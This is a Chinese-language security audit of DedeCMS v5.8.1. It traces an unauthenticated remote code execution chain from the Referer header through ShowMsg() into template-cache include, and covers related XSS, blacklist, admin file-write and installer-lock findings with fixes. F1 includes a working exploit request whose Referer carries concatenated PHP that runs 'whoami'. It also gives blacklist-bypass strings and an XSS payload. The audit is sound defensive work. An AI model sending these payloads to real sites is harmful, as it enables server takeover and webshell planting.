# DedeCMS v5.8.1 代码审计 - 首批发现

- 目标源码: `_tmp/dede/DedeCMS-5.8.1`（GitHub dedecms/DedeCMS tag v5.8.1 官方 release 包）
- 源包大小: 5,639,332 字节；解压后 897 个文件
- 审计时间: 2026-11-25
- 审计方式: 手工污点回溯 + 自写 sink 扫描器 `tools/cms_sink_scan.py` + 定点 grep
- 扫描产物: `_tmp/dede_scan.json`，1965 条 sink 命中

## 命中统计

| 类别 | 命中数 | 文件数 |
| --- | --- | --- |
| sink_sql | 1073 | 231 |
| sink_file | 484 | 104 |
| sink_exec | 104 | 9 |
| sink_include | 35 | 26 |
| sink_ssrf | 30 | 20 |
| sink_upload | 24 | 17 |
| sink_xss | 21 | 7 |
| sink_deser | 15 | 9 |
| source | 179 | 54 |

## F1 严重: ShowMsg() 取 Referer 落模板缓存并 include，前台未授权 RCE

链路（全部为实际代码行号）:

1. `plus/flink.php:18` `if ($dopost == 'save') {`
2. `plus/flink.php:19-24` 取 `$validate` 与 `GetCkVdValue()`，不相等即 `ShowMsg('验证码不正确!', '-1');`（验证码错也能进 sink）
3. `include/common.func.php:236-241`

```php
if ($gourl == -1) {
    $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    if ($gourl == "") {
        $gourl = -1;
    }
}
```

4. `include/common.func.php:281-284`

```php
$func .= "var pgo=0;
      function JumpUrl(){
        if(pgo==0){ location='$gourl'; pgo=1; }
      }\r\n";
```

5. `include/common.func.php:301-306`

```php
$msg = $htmlhead . $rmsg . $htmlfoot;
$tpl = new DedeTemplate();
$tpl->LoadString($msg);
$tpl->Display();
```

6. `include/dedetemplate.class.php:371-377`

```php
public function Display()
{
    global $gtmpfile;
    extract($GLOBALS, EXTR_SKIP);
    $this->WriteCache();
    include $this->cacheFile;
}
```

7. `include/dedetemplate.class.php:436-455` 写入 `data/tplcache/` 下缓存文件，`CheckDisabledFunctions()` 过滤失败才 unlink。

结论: `Referer` 完全可控 → 拼进模板字符串 → 落盘 → `include`，PHP 段直接执行。写入前只有黑名单过滤，可用拼接绕过。

触发点（无需登录，验证码错误的失败分支即可）:

```
GET /plus/flink.php?dopost=save HTTP/1.1
Host: target
Referer: <?php $a='syste';$b='m';$c=$a.$b;$c('whoami');?>
```

其他前台可达的 `ShowMsg(..., '-1')` 入口（同一 sink，共 40+ 处），主要文件:

- `plus/flink.php:22`
- `plus/carbuyaction.php:80,84,88,94,98,108,112,124,130,133,173,244,250,253`
- `plus/download.php:28,35,188,238`
- `plus/guestbook.php:57`
- `plus/posttocar.php:28,34,40,47`
- `plus/recommend.php:28,38,45,82`
- `plus/search.php:78,83,91`
- `plus/users-do.php:25,29,59,65,69,165`
- `plus/users-reg-new.php:34,44,48,52,56,65,70,79,87,94,153,198,222,228`
- `plus/users_config.php:100,181`
- `plus/view.php:106,120`

## F2 高危: 同一 sink 的反射型 XSS

`include/common.func.php:283` 把 `$gourl` 原样塞进 `location='...'`；`:292` 再塞进 `href='...'`。Referer 里带 `'` 即可闭合字符串注入 JS 或构造 `href` 属性。入口同 F1 的 40+ 个 `ShowMsg(...,'-1')`，不需要登录。

## F3 中危: CheckDisabledFunctions 过滤逻辑写错

`include/dedetemplate.class.php:419`

```php
if ($token[0] = '306' && in_array($token[1], $disabled_functions)) {
```

`=` 是赋值，不是比较，条件退化成"token 文本命中黑名单"。黑名单本身也可绕:

- 字符串拆分 `$a='syste';$b='m';$c=$a.$b;$c('cmd');`
- 引号包裹函数名 `"system"('cmd')`

黑名单在 `:412`: `phpinfo,eval,exec,passthru,...`

## F4 中危: 模板引擎 include 可控 cacheFile

`include/dedetemplate.class.php:376`、`:390` 直接 `include $this->cacheFile;`。只要能让 `cacheFile` 指向自定义内容（F1 就是最短路径），即可落地执行。`data/tplcache` 目录默认可写，不随安装锁关闭。

## F5 高危（需后台）: 后台 10+ 处 base64 直写文件

`dede/` 下各 add/edit 控制器把 POST 里的 base64 内容直接写到 `$cfg_basedir . $fullUrl`:

- `dede/album_add.php:172,290`
- `dede/album_edit.php:164,249,361`
- `dede/archives_add.php:150`
- `dede/archives_edit.php:146`
- `dede/article_add.php:136`
- `dede/article_edit.php:176`
- `dede/soft_add.php:153`
- `dede/soft_edit.php:185`
- `dede/spec_add.php:118`
- `dede/spec_edit.php:121`

配套上传落地:

- `dede/module_make.php:87,92,216,227` 把上传文件直接落成 `.php`
- `dede/module_upload.php:30`
- `dede/file_manage_control.php:105`
- `dede/friendlink_add.php:34`

拿到后台会话即可写 webshell；后台 CSRF 也能把这条链接起来。

## F6 部署面: 安装目录只靠文件锁

`install/index.php:42-44` 仅判断 `install/install_lock.txt` 是否存在。删锁重装即可覆盖数据库配置；打包发布时带 `install/` 目录的站点直接暴露这条路径。

## 已核查、判为不成立的项

- `plus/vote.php:42` `aid` 在 `:30` 已被 `is_numeric` 约束，SQL 不可注。
- `plus/mytag_js.php:28` `aid` 在 `:20` 被 `is_numeric` 约束，SQL 不可注。
- `plus/guestbook.php:65` `reid` 在 `:51` 已 `intval`，SQL 不可注。
- `plus/download.php:87` 有 host 白名单 `in_array($linkinfo['host'], $allowed)`，跳转/SSRF 已被收口。
- `install/index.php` 之外的 `install/module-install.php:21` 同样有锁文件判断。

## 修复要点

1. `ShowMsg()` 里 `$gourl` 只允许站内相对路径：`preg_match('#^/[a-zA-Z0-9_\-./?=&%]*$#', $gourl)`，不匹配就回落 `-1`。
2. `location='$gourl'` 改为 `json_encode($gourl)` 输出，`href` 走 `htmlspecialchars($gourl, ENT_QUOTES)`。
3. 模板缓存文件改成 `.php` 之外的后缀无用，关键是写入前禁止出现 `<?`：`if (strpos($result, '<?') !== false) { unlink; die; }`。
4. `CheckDisabledFunctions()` 修成 `$token[0] === T_STRING`，黑名单换成白名单化的 `token_get_all` AST 校验。
5. 后台文件写入统一改为白名单扩展名 + 固定目录 + 随机文件名，禁止路径拼接用户输入。
6. 生产包删除 `install/`，或 web 层直接 403。

## 复现验证清单

- `GET /plus/flink.php?dopost=save` + 恶意 Referer，观察 `data/tplcache/` 新增文件
- 响应体是否出现 `location='<payload>'`
- 二次请求触发 include 后命令回显
- 换 `Referer: '><script>alert(1)</script>` 验证 F2

## 产物

- 源码: `_tmp/dede/DedeCMS-5.8.1/`
- 扫描结果: `_tmp/dede_scan.json`
- 扫描器: `tools/cms_sink_scan.py`
